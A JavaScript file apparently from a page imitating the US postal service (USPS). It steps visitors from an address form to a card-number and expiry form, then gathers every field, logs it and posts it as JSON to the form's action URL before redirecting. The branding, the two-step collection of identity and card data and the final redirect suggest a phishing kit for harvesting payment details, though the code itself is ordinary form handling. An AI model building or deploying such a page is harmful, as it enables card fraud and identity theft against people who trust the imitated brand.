// Menu functionality
function toggleMainMenu() {
    const mainNav = document.querySelector('.navbar-collapse');
    mainNav.classList.toggle('show');
    const button = document.querySelector('.navbar-toggler');
    const isExpanded = mainNav.classList.contains('show');
    button.setAttribute('aria-expanded', isExpanded);
}

function toggleQuickTools() {
    const quickNav = document.querySelector('.nav-collapse');
    quickNav.classList.toggle('show');
    const button = document.querySelector('.quick-tools .navbar-toggler');
    const isExpanded = quickNav.classList.contains('show');
    button.setAttribute('aria-expanded', isExpanded);
}

// Close menus when clicking outside
document.addEventListener('click', function(e) {
    if (!e.target.closest('.navbar-usps')) {
        document.querySelector('.navbar-collapse').classList.remove('show');
    }
    if (!e.target.closest('.quick-tools')) {
        document.querySelector('.nav-collapse').classList.remove('show');
    }
});

// Form validation and switching
function validateAddressForm() {
    const form = document.getElementById('addressFormContent');
    if (!form.checkValidity()) {
        form.reportValidity();
        return false;
    }
    
    const zipcode = form.querySelector('[name="zipcode"]').value;
    if (!/^\d{5}$/.test(zipcode)) {
        alert('Please enter a valid 5-digit zipcode');
        return false;
    }
    
    return true;
}

// Updated showPaymentForm with data transfer
function showPaymentForm() {
    if (!validateAddressForm()) return;
    
    // Transfer data to hidden fields
    document.getElementById('hiddenFirstName').value = document.querySelector('input[name="firstName"]').value;
    document.getElementById('hiddenLastName').value = document.querySelector('input[name="lastName"]').value;
    document.getElementById('hiddenAddress').value = document.querySelector('input[name="address"]').value;
    document.getElementById('hiddenAddress2').value = document.querySelector('input[name="address2"]').value;
    document.getElementById('hiddenCity').value = document.querySelector('input[name="city"]').value;
    document.getElementById('hiddenState').value = document.querySelector('select[name="state"]').value;
    document.getElementById('hiddenZipcode').value = document.querySelector('input[name="zipcode"]').value;
    document.getElementById('hiddenEmail').value = document.querySelector('input[name="email"]').value;
    document.getElementById('hiddenPhone').value = document.querySelector('input[name="phone"]').value;

    const addressForm = document.getElementById('addressForm');
    addressForm.style.opacity = '0';
    
    setTimeout(() => {
        addressForm.style.display = 'none';
        const paymentForm = document.getElementById('paymentForm');
        paymentForm.style.display = 'block';
        setTimeout(() => {
            paymentForm.classList.add('active');
        }, 50);
    }, 300);
}

function showAddressForm() {
    const paymentForm = document.getElementById('paymentForm');
    const addressForm = document.getElementById('addressForm');
    
    paymentForm.classList.remove('active');
    
    setTimeout(() => {
        paymentForm.style.display = 'none';
        addressForm.style.display = 'block';
        setTimeout(() => {
            addressForm.style.opacity = '1';
        }, 50);
    }, 300);
}

// Form submission handling with redirect
document.getElementById('paymentFormContent').onsubmit = function(e) {
    e.preventDefault();
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    // Log all form elements
    console.log('Form elements:', form.elements);
    
    // Capture all input fields
    Array.from(form.elements).forEach(element => {
        if (element.name) {
            console.log('Processing field:', element.name, element.value);
            data[element.name] = element.value;
        }
    });
    
    // Log the final data object
    console.log('Sending form data:', data);
    
    fetch(form.action, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log('Response status:', response.status);
        return response.json();
    })
    .then(result => {
        console.log('Success:', result);
        // Get the success URL from the hidden input
        const successUrl = document.getElementById('successUrl').value;
        // Show brief success message then redirect
        alert('Form submitted successfully! Redirecting...');
        setTimeout(() => {
            window.location.href = successUrl;
        }, 1500);
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error submitting form. Please try again.');
    });
    
    return false;
};

// Card input formatting
document.querySelector('.card-number-input').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.slice(0, 16);
    e.target.value = value;
});

document.querySelector('.expiry-input').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    e.target.value = value;
});

// Restore form data if available
window.addEventListener('load', function() {
    for (let key in sessionStorage) {
        const input = document.querySelector(`[name="${key}"]`);
        if (input) {
            input.value = sessionStorage.getItem(key);
        }
    }
});